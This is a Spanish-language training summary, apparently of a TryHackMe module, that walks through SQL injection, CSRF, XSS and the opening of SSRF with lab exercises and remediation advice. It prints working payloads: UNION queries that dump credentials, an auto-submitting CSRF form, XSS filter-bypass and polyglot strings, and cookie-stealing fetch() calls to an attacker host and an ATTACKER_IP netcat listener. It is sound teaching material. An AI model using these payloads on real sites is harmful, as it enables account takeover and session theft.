<h1>
  <img src="https://cdn-images.tryhackme.com/modules/web-application-vulnerabilities-i-1778910743514.svg" width="70px" align="absmiddle">
  <span> WEB APPLICATION VULNERABILITIES I</span>
</h1>

---

> Este módulo lo guía a través de cinco de las vulnerabilidades más impactantes en las aplicaciones web modernas, examinando cómo funciona cada una, por qué persiste y cómo los atacantes la explotan en la naturaleza. Comenzará con los clásicos, la inyección de SQL y el scripting entre sitios, antes de pasar a errores más sutiles como CSRF, SSRF e IDOR que a menudo pasan por alto incluso a los desarrolladores experimentados. Un desafío práctico final reúne todas las técnicas, por lo que terminas el módulo capaz de detectar estos problemas rápidamente y explotarlos con confianza.

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/6808d44047ac5684351c94da-1779110941603" width="60px" align="absmiddle">
  <span> Introducción a la Inyección SQL (SQL Injection)</span>
</h2>

### 1.1 Introducción
La inyección SQL (SQLi) es una de las vulnerabilidades de aplicaciones web más conocidas y peligrosas. Enumerada en la categoría A05:2025 - Inyección del OWASP Top 10, ocurre cuando un atacante es capaz de manipular las consultas SQL que una aplicación web envía a su base de datos. Las consecuencias pueden ser severas: acceso no autorizado a datos confidenciales, anulación de autenticación, modificación o eliminación de registros y, en ciertos casos, el control total del servidor de base de datos.

A pesar de ser una de las clases de vulnerabilidades más antiguas, SQLi sigue apareciendo en aplicaciones modernas y ha sido la causa raíz de numerosas filtraciones de datos de alto perfil. Para un pentester, entender cómo identificar y explotar SQLi es una habilidad fundamental durante toda su carrera.

<br>

### 1.2 Fundamentos de SQL para Inyección (SQL Essentials for Injection)
Antes de profundizar en las técnicas de inyección, es necesario entender varios elementos avanzados del lenguaje SQL que sirven como bloques de construcción para los payloads.

#### Comentarios SQL (SQL Comments)
Los comentarios le indican a la base de datos que ignore todo el texto que sigue en la misma línea. En MySQL, se utiliza `-- ` (doble guión seguido de un espacio) o `#` para comentarios de una sola línea, mientras que los comentarios multilínea utilizan `/* */`. En una inyección, comentar el resto de la consulta original es crucial para eliminar la sintaxis posterior que de otro modo generaría un error de código.

#### Operador UNION
El operador `UNION` combina los resultados de dos o más instrucciones `SELECT` en un único conjunto de resultados. Existe una regla crítica: ambas consultas deben devolver exactamente el mismo número de columnas y los tipos de datos deben ser compatibles. Los atacantes utilizan `UNION` para adjuntar una consulta propia y extraer datos de tablas totalmente diferentes.

#### Operador LIKE y Comodines (LIKE and Wildcards)
El operador `LIKE` realiza búsquedas de patrones en cadenas de texto. El comodín `%` coincide con cualquier secuencia de caracteres y `_` coincide con un solo carácter. En inyecciones ciegas (Blind SQLi), los atacantes usan `LIKE` para adivinar datos carácter por carácter probando patrones secuenciales como `LIKE 'a%'`, `LIKE 'b%'`, etc.

#### Cláusula LIMIT
La cláusula `LIMIT` (sintaxis `LIMIT offset, count`) permite restringir el número de filas devueltas. En los payloads de inyección, `LIMIT` se utiliza para seleccionar una fila específica o evitar saturar la salida cuando hay múltiples resultados.

#### Funciones de Cadenas (String Functions)
Destacan dos funciones para la exfiltración:
`GROUP_CONCAT()`: Agrupa valores de múltiples filas en una sola cadena separada por comas, permitiendo obtener todos los registros de una sola vez.
`CONCAT()`: Une valores individuales dentro de una sola fila, por ejemplo `CONCAT(username, ':', password)` para obtener `admin:pass123`.

#### La Base de Datos information_schema
Los motores MySQL, MariaDB y PostgreSQL incluyen una base de datos integrada llamada `information_schema`, que actúa como el mapa o catálogo de metadatos de todo el servidor. Dos tablas clave son:
`information_schema.tables`: Contiene el nombre de cada base de datos (`table_schema`) y sus tablas (`table_name`).
`information_schema.columns`: Detalla las columnas (`column_name`) pertenecientes a cada tabla.

<br>

### 1.3 ¿Qué es la Inyección SQL? (What is SQL Injection?)
Ocurre cuando una aplicación web incorpora la entrada del usuario directamente dentro de una consulta SQL sin saneamiento ni parametrización. El intérprete trata la entrada como código ejecutable en lugar de como datos planos.

#### Cómo usan SQL las aplicaciones web
Las aplicaciones dinámicas consultan la base de datos constantemente para construir las páginas visualizadas. Cuando visitas `https://website.thm/article?id=1`, el servidor toma el parámetro `1` y construye una consulta `SELECT * FROM article WHERE id = 1`.

#### Dónde reside la vulnerabilidad
El problema surge al concatenar cadenas en el código del servidor (`"SELECT * FROM article WHERE id = " + id`). Si el parámetro se cambia a `1 OR 1=1--`, la consulta resultante devolverá todos los registros de la tabla, incluyendo los privados.

#### Los tres tipos de Inyección SQL
**En Banda (In-Band):** La salida se devuelve directamente en la respuesta HTTP. Incluye la inyección basada en errores y la basada en UNION.
**Ciega (Blind):** No hay mensajes de error ni datos visibles. La inferencia se realiza mediante respuestas booleanas o retardos de tiempo (`SLEEP()`).
**Fuera de Banda (Out-of-Band / OOB):** Fuerza a la base de datos a realizar solicitudes de red salientes (DNS/HTTP) hacia un servidor externo controlado por el atacante.

#### Detección de Inyección SQL
Se prueban caracteres especiales en todas las entradas (URL, formularios, cookies, encabezados HTTP):
Comilla simple `'`: Si devuelve un error de base de datos, la entrada no se maneja adecuadamente.
Comilla doble `"` y comentarios `;--`: Observar si altera la sintaxis o el comportamiento.
Lógica `OR 1=1`: Verificar si modifica los registros mostrados.

<br>

### 1.4 Inyección SQL En Banda (In-Band SQL Injection)
#### Basada en Errores (Error-Based SQLi)
Aprovecha las malas configuraciones donde la aplicación expone mensajes de error técnicos sin procesar. Estos errores revelan el tipo de motor de base de datos, la estructura de la consulta e incluso datos internos cuando se provocan fallos deliberados.

#### Basada en UNION (Union-Based SQLi)
Usa el operador `UNION` para extraer datos siguiendo una metodología paso a paso:
**Determinar el número de columnas:** Probar `UNION SELECT 1`, `UNION SELECT 1,2`, etc., hasta que no dé error.
**Identificar columnas visibles:** Cambiar la consulta original a un ID inexistente (`id=0`) para que solo se muestren en pantalla los números del `UNION SELECT`.
**Extraer el nombre de la base de datos:** Reemplazar el número visible por `database()`.
**Enumerar tablas:** Consultar `information_schema.tables`.
**Enumerar columnas:** Consultar `information_schema.columns`.
**Extraer datos:** Seleccionar los campos deseados usando `GROUP_CONCAT()`.

<br>

### 1.5 Inyección SQL Ciega: Anulación de Autenticación (Blind SQLi: Authentication Bypass)
Ocurre cuando la aplicación no muestra salidas ni errores de la base de datos, pero reacciona permitiendo o denegando el acceso. Los formularios de login verifican credenciales con consultas como `SELECT * FROM users WHERE username='INPUT' AND password='INPUT'`.

Si se inyecta `' OR 1=1;--` en el usuario, la condición `1=1` se evalúa como verdadera y la comprobación de clave queda comentada, devolviendo la cuenta del primer usuario (habitualmente el administrador). Para objetivar un usuario específico se puede inyectar `admin'--`.

<br>

### 1.6 Inyección SQL Ciega: Basada en Booleanos y Tiempo (Blind SQLi: Boolean and Time-Based)
#### Basada en Booleanos (Boolean-Based)
La aplicación devuelve una señal binaria (diferencia entre verdadero/falso en el HTML o JSON). Se inyectan condiciones lógicas con el operador `LIKE` para adivinar el nombre de bases de datos, tablas y campos carácter por carácter.

#### Basada en Tiempo (Time-Based)
Se utiliza cuando la respuesta visual es 100% idéntica. Se inyecta la función `SLEEP(5)` en MySQL o `WAITFOR DELAY '0:0:5'` en MSSQL dentro de una condición lógica. Si la condición es verdadera, el servidor pausará su respuesta durante los segundos indicados.

<br>

### 1.7 Inyección SQL Fuera de Banda (Out-of-Band SQL Injection)
Se utiliza cuando las técnicas en banda no son posibles y las ciegas son inestables o demasiado lentas. Requiere que el servidor de base de datos tenga permisos para realizar conexiones de red salientes.

En MySQL sobre Windows, se usa `LOAD_FILE()` especificando una ruta UNC (`\\data.attacker.com\share`). En MSSQL, se utilizan procedimientos como `xp_dirtree` o `xp_cmdshell` para forzar la resolución DNS o ejecutar comandos de red.

<br>

### 1.8 Remediación y Prevención de SQLi
**Consultas Preparadas (Sentencias Parametrizadas):** Separan la estructura de la consulta de los datos introducidos por el usuario, imposibilitando que la entrada altere la lógica SQL.
**Validación de Entrada:** Aplicar listas de permitidos (*allowlists*) para asegurar que los parámetros cumplan con el formato y tipo esperado (por ejemplo, enteros numéricos).
**Escapado de Caracteres:** Colocar barras invertidas ante caracteres especiales (medida de segundo nivel).
**Principio de Mínimo Privilegio:** Restringir los permisos de la cuenta de base de datos utilizada por la aplicación web.
**Firewalls de Aplicación Web (WAF):** Inspeccionar solicitudes entrantes para filtrar patrones de ataque conocidos.

<br>

### 1.9 Práctica Guiada: Laboratorio de Inyección SQL
En la resolución práctica del laboratorio *Level One - Error Based SQLi*:
**Reconocimiento:** Se identifica el parámetro `id` en `https://website.thm/article?id=1`.
**Determinación de columnas:** `order by 4` devuelve un error `Unknown column '4'`, confirmando que la consulta maneja 3 columnas.
**Identificación de columnas visibles y BD:** `id=0 UNION SELECT 1,2,database()` devuelve el nombre de la base de datos `sqli_one` en la columna visible 2.
**Enumeración de tablas:** `id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one'` revela las tablas `article` y `staff_users`.
**Enumeración de columnas:** `id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='staff_users'` devuelve `id,password,username`.
**Exfiltración de credenciales:** `id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users` expone las credenciales, obteniendo la clave del usuario `martin` (`pa$$word`).

<br>

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1775466711834" width="60px" align="absmiddle">
  <span> Introducción a la Falsificación de Solicitudes en Sitios Cruzados (CSRF)</span>
</h2>

### 2.1 Introducción y Concepto General
Las aplicaciones web modernas dependen de las sesiones autenticadas para llevar a cabo acciones en nombre de los usuarios. Cuando un usuario inicia sesión en una aplicación web, el servidor genera un identificador de sesión que se almacena en el navegador en forma de cookie de sesión. En cada interacción posterior, el navegador adjunta automáticamente esta cookie para que el servidor reconozca al usuario.

Aunque este mecanismo aporta comodidad, genera una vulnerabilidad crítica conocida como **Falsificación de Solicitudes en Sitios Cruzados (Cross-Site Request Forgery - CSRF)**. En lugar de intentar robar las credenciales o la cookie de la víctima, un ataque CSRF engaña al navegador para que envíe una solicitud HTTP maliciosa a un sitio web donde el usuario ya se encuentra autenticado. Dado que el navegador adjunta automáticamente la cookie de sesión legítima, la aplicación web procesa la petición como si hubiera sido realizada intencionadamente por el usuario.

<br>

### 2.2 ¿Qué es CSRF? (What is CSRF?)
CSRF es una vulnerabilidad de control de acceso en la que un atacante abusa de la relación de confianza entre el navegador de la víctima y el sitio web de destino. Cuando un usuario autenticado visita una página web maliciosa controlada por el atacante mientras mantiene su sesión abierta en el sitio legítimo, esa página maliciosa puede desencadenar silenciosamente peticiones dirigidas al sitio de destino.

Si la solicitud ejecuta una acción confidencial o altera el estado del sistema (por ejemplo, cambiar la dirección de correo electrónico, actualizar la clave, realizar transferencias bancarias o modificar preferencias de seguridad), el atacante puede tomar el control parcial o total de la cuenta sin necesidad de conocer la contraseña del usuario.

#### Mecánica de un Ataque CSRF en Tres Pasos:
* **Autenticación Inicial:** La víctima inicia sesión en una aplicación web legítima (ejemplo: `staffhub.thm`) y su navegador guarda la cookie de sesión correspondiente.
* **Atracción y Ejecución:** El atacante utiliza ingeniería social (un enlace por correo electrónico, mensaje en chat o banner) para lograr que la víctima visite una página web maliciosa.
* **Petición Falsificada Automática:** La página maliciosa contiene un script o formulario que obliga al navegador de la víctima a enviar una solicitud a la aplicación web de destino. El navegador adjunta automáticamente la cookie de sesión válida y el servidor ejecuta la acción.

<br>

### 2.3 Por qué funciona CSRF (Why CSRF Works)
Es fundamental comprender que CSRF no existe porque los navegadores estén "rotos" o funcionen mal. De hecho, los navegadores se comportan exactamente conforme a sus especificaciones de diseño al incluir automáticamente las cookies asociadas a un dominio en cada petición saliente dirigida a ese mismo dominio.

El problema radica exclusivamente en el servidor de la aplicación web: el servidor confía ciegamente en las peticiones únicamente porque incluyen una cookie de sesión válida, sin verificar en ningún momento el **origen real** de la solicitud (*Request Origin*). El servidor no diferencia si la petición fue generada voluntariamente por el usuario haciendo clic en la interfaz legítima o si fue disparada silenciosamente desde un sitio web malicioso externo.

#### Condiciones Clave para que exista una Vulnerabilidad CSRF:
 Para que un punto final (*endpoint*) sea susceptible a un ataque CSRF, deben coincidir tres condiciones simultáneas:
* **Usuario Autenticado:** La víctima debe contar con una sesión activa en la aplicación de destino y disponer de una cookie de sesión almacenada en su navegador.
* **Acción de Cambio de Estado:** La solicitud debe realizar una operación relevante que altere datos o configuraciones en el servidor (no simplemente consultar o leer información).
* **Ausencia de Parámetros Impredecibles:** La solicitud no contiene ningún parámetro aleatorio o impredecible para el atacante (como tokens anti-CSRF). El atacante conoce con precisión la estructura exacta de la petición necesaria para ejecutar la acción.

<br>

### 2.4 Identificación y Descubrimiento de Vulnerabilidades CSRF
Durante una auditoría de seguridad o prueba de penetración, el auditor debe inspeccionar las funcionalidades de la aplicación e identificar qué solicitudes realizan cambios de estado. 

Las acciones más frecuentemente vulnerables a CSRF incluyen:
Cambios de correo electrónico de la cuenta.
Restablecimiento o cambio de contraseña.
Actualización de perfil y roles de usuario.
Transferencias de dinero o transacciones financieras.
Modificación de ajustes de seguridad (como desactivar la verificación en dos pasos).

#### El Mito de GET vs. POST (GET vs. POST - A Common Misconception)
Existe el mito muy extendido de que usar el método HTTP `POST` en lugar de `GET` protege automáticamente a una aplicación contra ataques CSRF. **Esto es completamente falso.** 

Tanto las peticiones `GET` como las `POST` son vulnerables si el servidor no comprueba el origen de la solicitud. Si bien una petición `GET` vulnerable se puede explotar fácilmente mediante una simple etiqueta HTML de imagen (`<img src="http://vulnerable.com/change-email?email=evil@mail.com">`) o un enlace, una petición `POST` se explota con igual facilidad mediante un formulario HTML oculto enviado automáticamente con JavaScript. Por tanto, el método de la petición no constituye una medida de seguridad por sí mismo.

<br>

### 2.5 Explotación mediante Formularios HTML y Caso Práctico
En el laboratorio práctico de la sala de TryHackMe (*StaffHub* en `http://staffhub.thm:8080`), los usuarios pueden cambiar su correo electrónico en la página de configuración. Al inspeccionar la solicitud HTTP emitida al guardar el formulario, se observa una petición `POST` a `/settings` conteniendo únicamente el parámetro `email`. No existe ningún token anti-CSRF ni parámetro de verificación adicional.

#### Construcción de la Página Maliciosa (`settings.html`):
El atacante aloja en su propio servidor web (por ejemplo, en `http://attacker-ip:81/settings.html`) una página que contiene un formulario HTML configurado para enviar la petición exacta al servidor objetivo de la víctima:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Página Promocional Maliciosa</title>
  </head>
  <body>
    <h1>¡Felicidades! Has ganado un premio.</h1>
    <!-- Formulario oculto dirigido al endpoint vulnerable de la víctima -->
    <form id="csrfForm" action="http://staffhub.thm:8080/settings" method="POST">
      <input type="hidden" name="email" value="attacker@evilmail.thm" />
    </form>

    <script>
      // Envío automático del formulario tan pronto como la víctima carga la página
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
```

#### Flujo de la Explotación:
La víctima, teniendo su sesión iniciada en `staffhub.thm`, hace clic en el enlace malicioso `http://attacker-ip:81/settings.html`.
La página se carga y el script ejecutable `document.getElementById('csrfForm').submit()` envía el formulario oculto inmediatamente por debajo.
El navegador de la víctima procesa la petición `POST` hacia `http://staffhub.thm:8080/settings` e incluye automáticamente la cookie de sesión de `staffhub.thm`.
El servidor backend de StaffHub recibe la petición, valida la cookie de sesión legítima, no encuentra ningún token que verifique el origen y actualiza la dirección de correo a `attacker@evilmail.thm`.
El atacante ahora puede solicitar el restablecimiento de contraseña hacia su propio correo y apoderarse por completo de la cuenta.

<br>

### 2.6 Remediación y Prevención de CSRF
**Tokens Anti-CSRF:** Es la defensa principal y más efectiva. El servidor genera un token aleatorio, único, criptográficamente seguro y asociado a la sesión del usuario. Cada formulario de cambio de estado debe incluir este token en un campo oculto (`<input type="hidden" name="csrf_token" value="...">`). Al recibir la solicitud, el servidor compara el token enviado con el almacenado en la sesión; si no coinciden o falta, la solicitud se descarta.
**Atributos de Cookie `SameSite`:** Configurar las cookies de sesión con las banderas de seguridad adecuadas:
`SameSite=Strict`: Impide que el navegador envíe la cookie en cualquier petición desencadenada por un sitio de origen cruzado. Es la protección máxima.
`SameSite=Lax`: Permite enviar la cookie únicamente en navegaciones de nivel superior iniciadas por el usuario mediante enlaces seguros `GET`, bloqueando el envío en formularios `POST` de origen cruzado.
* **Reautenticación de Operaciones Sensibles:** Solicitar al usuario que ingrese su contraseña actual antes de procesar cambios críticos (como modificar la clave o el correo electrónico).
* **Verificación de Encabezados `Origin` y `Referer`:** Comprobar en el lado del servidor que los encabezados HTTP `Origin` o `Referer` coincidan con el dominio legítimo de la aplicación.

<br>

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/691e303c8bb7e99b93a58132-1775464376816" width="60px" align="absmiddle">
  <span> Introducción a Scripts en Sitios Cruzados (XSS)</span>
</h2>

### 3.1 Introducción y Terminología Importante
Las aplicaciones web modernas procesan gran cantidad de interacciones de usuario y el **Scripting en Sitios Cruzados (Cross-Site Scripting - XSS)** sigue siendo una de las vulnerabilidades más frecuentes y con mayor impacto. Ocurre cuando una aplicación web acepta entradas del usuario y las incluye en las páginas enviadas al navegador sin haberlas filtrado o codificado adecuadamente. Esto permite a un atacante inyectar código ejecutable JavaScript en el navegador de otros usuarios.

#### Conceptos y Terminología Clave:
* **Modelo de Objetos del Documento (DOM - Document Object Model):** Es la representación en memoria y estructurada en árbol (etiquetas, atributos, texto) que hace el navegador de una página web. JavaScript lee y modifica dinámicamente este árbol en tiempo real para actualizar la interfaz.
* **Parámetros de URL (Query Strings):** Datos pasados a través de la barra de direcciones después del símbolo `?` (ejemplo: `https://site.com/search?q=producto`). Al ser totalmente editables por el usuario, deben tratarse siempre como entradas no confiables.
* **JavaScript:** Lenguaje de programación que se ejecuta en el cliente (navegador). Los payloads de XSS son fragmentos de JavaScript que se ejecutan bajo el contexto de seguridad y sesión del sitio web vulnerable.
* **Cookies y la bandera `HttpOnly`:** Las cookies almacenan datos de sesión. Si una cookie de sesión no tiene la bandera `HttpOnly`, el código JavaScript inyectado puede leerla mediante `document.cookie` y exfiltrarla al atacante. La bandera `HttpOnly` bloquea la lectura de cookies desde JavaScript.
* **Escapado / Codificación de Salida (*Output Encoding*) vs. Filtrado:**
*Escapado (Codificación):* Transforma caracteres especiales en entidades HTML seguras (por ejemplo, convierte `<` en `&lt;` y `>` en `&gt;`), logrando que el navegador renderice la entrada estrictamente como texto plano sin ejecutarla como código.
*Filtrado (Validación):* Comprueba que la entrada cumpla con ciertas reglas de formato (letras, longitud), pero no impide que los datos se interpreten como código si no se codifican al imprimirlos en el HTML.

<br>

### 3.2 Payloads de XSS y sus Intenciones
Un **payload de XSS** es la cadena de código JavaScript inyectada por el atacante para que sea ejecutada en el navegador de la víctima. 

Un payload consta de dos partes principales:
* **Intención:** Lo que el atacante desea lograr (PoC, robar sesión, registrar teclas, alterar la lógica).
* **Arreglo / Ajuste (*Context Adjustment*):** Las modificaciones en la sintaxis requeridas para cerrar etiquetas HTML, atributos o comillas previas y permitir la ejecución del script según la estructura del código fuente de la página.

<br>

#### Tipos de Intenciones según el Objetivo del Atacante:
* **Prueba de Concepto (PoC):** El payload más simple para demostrar la presencia de la vulnerabilidad sin causar daño, comúnmente `<script>alert('XSS')</script>`.
* **Robo de Sesión (Session Hijacking):** Extrae la cookie de autenticación del usuario y la envía al servidor del atacante:
  ```javascript
  fetch('http://servidor-atacante.com/log?cookie=' + btoa(document.cookie));
  ```
* **Registrador de Teclas (*Keylogger*):** Captura todas las pulsaciones de teclado que efectúa el usuario en la página vulnerable (usuarios, contraseñas, tarjetas) y las exfiltra en tiempo real a un servidor externo.
* **Ataques a la Lógica de Negocio:** Invoca funciones JavaScript internas de la aplicación. Si existe una función como `user.changeEmail()`, el payload inyectado puede invocarla automáticamente para cambiar la clave o el correo del usuario objetivo:
  ```javascript
  user.changeEmail('attacker@evil.com');
  ```

<br>

### 3.3 XSS Reflejado (Reflected XSS - Non-Persistent)
Ocurre cuando la entrada suministrada por el usuario (parámetros de búsqueda en la URL, campos de formulario o encabezados HTTP) se incluye inmediatamente en la respuesta HTTP enviada por el servidor sin ser filtrada ni codificada.

Es un ataque **no persistente** porque la carga útil maliciosa no se guarda en la base de datos del servidor. Para explotarlo, el atacante debe convencer a la víctima de que haga clic en una URL maliciosa preparada o envíe un formulario.

#### Caso Práctico (Laboratorio AtlasNews en `http://MACHINE_IP:5000`):
Al ingresar una cadena de prueba en el buscador de la web de noticias, la aplicación lee el parámetro `q` de la URL (`http://MACHINE_IP:5000/?q=producto`) y refleja la palabra directamente en el mensaje de resultados: *"Resultados para: producto"*.

Al ingresar el payload `<script>alert('Hack')</script>` en la casilla de búsqueda, el servidor genera la respuesta HTML incluyendo el script directamente:
```html
<div>Resultados para: <script>alert('Hack')</script></div>
```
El navegador procesa la respuesta, interpreta la etiqueta `<script>` y despliega la ventana de alerta.

#### Causa Raíz en el Código Backend:
En el código de la aplicación Flask/Python (`app.py`), el controlador toma la variable sin sanear `q = request.args.get("q", "")` y la pasa a la plantilla Jinja marcándola explícitamente como segura:
```python
# Causa Raíz: renderizar entrada del usuario desactivando el escapado automático
return render_template("index.html", query=query, safe_query=Markup(query))
```
Al desactivar el escapado automático mediante el filtro `|safe` (`{{ query|safe }}`), cualquier código HTML o JS inyectado por el usuario se renderiza como código ejecutable.

<br>

### 3.4 XSS Almacenado (Stored XSS - Persistent)
El **XSS Almacenado** es la variante más peligrosa de XSS. Se produce cuando la entrada maliciosa enviada por el atacante se guarda permanentemente en el almacenamiento del servidor (base de datos, archivos de registro, comentarios, perfiles de usuario, sistemas de tickets) y posteriormente se sirve a otros usuarios que visitan la página.

No requiere engañar a los usuarios para que hagan clic en un enlace específico: cualquier usuario (incluyendo administradores) que visite la sección donde se muestra el registro guardado ejecutará el script malicioso automáticamente.

#### Caso Práctico (Laboratorio de Libro de Visitas en `http://MACHINE_IP:5000/guestbook`):
El portal permite a los usuarios publicar comentarios en un libro de visitas. Al enviar un comentario con el payload de prueba `<script>alert('You are Hacked')</script>`, la aplicación almacena la cadena directamente en la base de datos SQLite.

Cada vez que cualquier usuario (o un administrador) navega a `/guestbook`, el servidor lee los comentarios de la base de datos y genera el HTML incluyendo el script sin codificar. El navegador de cada visitante ejecuta la alerta inmediatamente.

#### Causa Raíz:
El backend guarda el texto plano en la base de datos y la plantilla Jinja2 lo imprime utilizando la etiqueta `{{ c.comment|safe }}`, omitiendo el escapado de caracteres HTML.

<br>

### 3.5 XSS Basado en DOM (DOM-Based XSS - Client Side)
El **XSS basado en DOM** se diferencia de las variantes reflejada y almacenada en que el ataque se ejecuta completamente en el lado del cliente (en el navegador). La entrada del atacante nunca llega al servidor ni es procesada por código backend.

Ocurre cuando el código JavaScript del cliente lee datos de una fuente controlable por el usuario (**Source**, como `location.search`, `location.hash`, `document.referrer`, `localStorage`) y los pasa a una función o punto de escritura inseguro (**Sink**, como `innerHTML`, `document.write()`, `eval()`, `element.outerHTML`).

#### Caso Práctico (Laboratorio de Vista Previa en `http://MACHINE_IP:5000/dom`):
La página contiene un campo de texto para previsualizar contenido en vivo. El script en JavaScript de la página lee la entrada introducida por el usuario y ejecuta la siguiente línea:
```javascript
// Causa Raíz en JS Cliente: Source (entrada) pasada directamente a Sink peligroso (innerHTML)
document.getElementById('previewArea').innerHTML = userInput;
```
Al ingresar `<img src="x" onerror="alert('DOM XSS')">`, el navegador interpreta el contenido asignado a `innerHTML`, fuerza el fallo al cargar la imagen inexistente `x` y ejecuta el manejador de eventos `onerror`, activando la alerta JavaScript sin que la petición haya pasado por el servidor backend.

<br>

### 3.6 XSS Ciego (Blind XSS)
El **XSS Ciego** es una variante especial de XSS almacenado donde el payload inyectado se guarda en el servidor pero se muestra en un área administrativa o panel interno al que el atacante no tiene acceso visual (por ejemplo, formularios de contacto, solicitudes de empleo, comentarios de soporte o logs de auditoría).

Al no tener visibilidad directa de la ejecución, el atacante debe incluir en su payload un mecanismo de retorno (*callback*) que realice una petición HTTP o DNS saliente hacia un servidor bajo su control, confirmando la ejecución y exfiltrando datos del panel interno.

#### Caso Práctico y Exfiltración de Cookies (Laboratorio Acme IT Support en `http://MACHINE_IP:8080`):
**Configuración del Escuchador:** En la máquina del atacante (AttackBox) se levanta un puerto a la escucha mediante Netcat para recibir la conexión saliente:
   ```bash
   nc -nlvp 9001
   ```
**Creación del Ticket con Payload de Exfiltración:** En el portal de soporte al cliente, se crea un ticket ingresando en el campo de Asunto un payload diseñado para salir del área de texto, ejecutar JavaScript y enviar las cookies de sesión del empleado de soporte que abra el ticket:
   ```html
   </textarea><script>fetch('http://ATTACKER_IP:9001/?cookie=' + btoa(document.cookie));</script>
   ```
**Ejecución y Captura:** Cuando el empleado de soporte abre el panel administrativo de tickets para revisar la solicitud, su navegador ejecuta el código JavaScript inyectado, lee la cookie de sesión del administrador (`document.cookie`), la codifica en Base64 con `btoa()` y envía la petición HTTP hacia `http://ATTACKER_IP:9001`.
**Recepción:** En la consola de Netcat se recibe la petición saliente:
   `GET /?cookie=c2Vzc2lvbj1ZX3JvYm90X2FkbWluX2tleQ== HTTP/1.1`
   Al decodificar la cadena Base64 con `echo 'c2Vzc2lvbj1...' | base64 -d`, se obtiene la cookie de sesión del administrador, permitiendo al atacante suplantar su identidad.

<br>

### 3.7 Perfeccionamiento del Payload y Adaptación al Contexto
Para lograr que un payload de XSS se ejecute correctamente, es indispensable analizar la estructura del código HTML donde la entrada es reflejada y adaptar la sintaxis de escape.

#### Nivel 1: Contexto HTML Plano
La entrada se muestra directamente entre etiquetas HTML normales (`<div>ENTRADA</div>`).
**Payload:** `<script>alert('THM')</script>`

#### Nivel 2: Contexto de Atributo HTML (`<input value="ENTRADA">`)
La entrada se refleja dentro del valor de un atributo entre comillas. Se debe cerrar las comillas y la etiqueta contenedora previa.
**Payload:** `"><script>alert('THM')</script>`

#### Nivel 3: Contexto dentro de Bloque Textarea (`<textarea>ENTRADA</textarea>`)
La entrada queda retenida como texto dentro de la etiqueta `<textarea>`. Se debe cerrar la etiqueta explícitamente antes de abrir el script.
**Payload:** `</textarea><script>alert('THM')</script>`

#### Nivel 4: Contexto dentro de Código JavaScript Existente (`var name = 'ENTRADA';`)
La entrada se refleja dentro de una variable en un bloque `<script>`. Se debe escapar de las comillas, finalizar la instrucción con punto y coma y comentar la sintaxis posterior con `//`.
**Payload:** `';alert('THM');//`

#### Nivel 5: Filtros de Eliminación de Palabras Clave (*Word Stripping*)
Si la aplicación aplica un filtro ingenuo que busca la palabra `script` y la elimina de la cadena, se puede eludir la restricción anidando la palabra eliminada dentro de sí misma.
**Payload:** `<scr<script>ipt>alert('THM')</scr<script>ipt>`
*Procesamiento del filtro:* Al eliminar el bloque central `script`, las letras restantes se unen volviendo a formar la palabra `<script>`.

#### Nivel 6: Filtro de Caracteres `<` y `>` mediante Manejadores de Eventos
Si la aplicación bloquea los signos menor y mayor que (`<` y `>`), impidiendo abrir nuevas etiquetas `<script>`, se pueden utilizar los atributos de eventos HTML de etiquetas existentes (como `onerror` o `onload` en etiquetas `<img>` o `<svg>`).
**Payload:** `/images/cat.jpg" onload="alert('THM');`

#### Políglotas XSS (XSS Polyglots)
Un **políglota XSS** es una cadena de código construida estratégicamente para escapar simultáneamente de múltiples contextos (atributos HTML, etiquetas sin cerrar, bloques JavaScript) y eludir filtros habituales. Un solo payload políglota puede funcionar en prácticamente cualquier contexto:
```javascript
jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/`/onload=alert('THM')//'>
```

<br>

### 3.8 Remediación y Prevención de XSS
**Codificación de Salida Sensible al Contexto (*Context-Aware Output Encoding*):** Es la solución primaria. Consiste en codificar todos los caracteres especiales antes de imprimirlos en pantalla según la ubicación exacta donde se inserten:
*Contexto HTML Body:* Convertir `<` $
ightarrow$ `&lt;`, `>` $
ightarrow$ `&gt;`, `&` $
ightarrow$ `&amp;`.
*Contexto de Atributos HTML:* Convertir comillas dobles `"` $
ightarrow$ `&quot;`, comillas simples `'` $
ightarrow$ `&#x27;`.
*Contexto JavaScript:* Utilizar codificación Unicode/Hexadecimal (ejemplo `'`).
**Atributo `HttpOnly` en Cookies de Sesión:** Configurar la bandera `HttpOnly` en todas las cookies sensibles para asegurar que JavaScript no pueda acceder a ellas mediante `document.cookie`.
**Política de Seguridad de Contenidos (CSP - Content Security Policy):** Implementar encabezados HTTP `Content-Security-Policy` restrictivos para definir qué fuentes de scripts son de confianza y bloquear la ejecución de scripts en línea (*inline scripts*) no autorizados.
**Marcos de Trabajo Modernos (*Frameworks*):** Utilizar motores de plantillas y frameworks frontend (como React, Angular o Vue) que aplican escapado automático contextual por defecto.

<br>

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/268e10b8ee0b53d1074b2a7fd5b1a789.png" width="60px" align="absmiddle">
  <span> Introducción a la Falsificación de Solicitudes en el Servidor (SSRF)</span>
</h2>

### 4.1 Introducción y ¿Qué es SSRF?
**Server-Side Request Forgery (SSRF)** es una vulnerabilidad de seguridad que permite a un atacante manipular una función de la aplicación web del lado del servidor para forzarla a realizar peticiones HTTP (u otros protocolos) hacia direcciones de red arbitrarias elegidas por el atacante.

En un ataque SSRF típico, la aplicación web recibe un parámetro con una dirección URL o nombre de host (por ejemplo, para descargar una imagen de perfil, generar un informe PDF o procesar un webhook) y realiza una conexión HTTP saliente desde el backend. SSRF abusa de la **confianza implícita** que tienen los sistemas y redes internas en el servidor de aplicaciones web: los servicios backend, bases de datos e interfaces de administración locales aceptan las peticiones que se originan desde una IP interna sin solicitar autenticación adicional. El atacante hereda efectivamente esa posición privilegiada en la red.

#### Categorías de SSRF:
* **SSRF Regular (In-Band / Visible):** La respuesta del recurso interno solicitado es devuelta por el servidor e impresa directamente en la pantalla del usuario, permitiendo la lectura inmediata de datos.
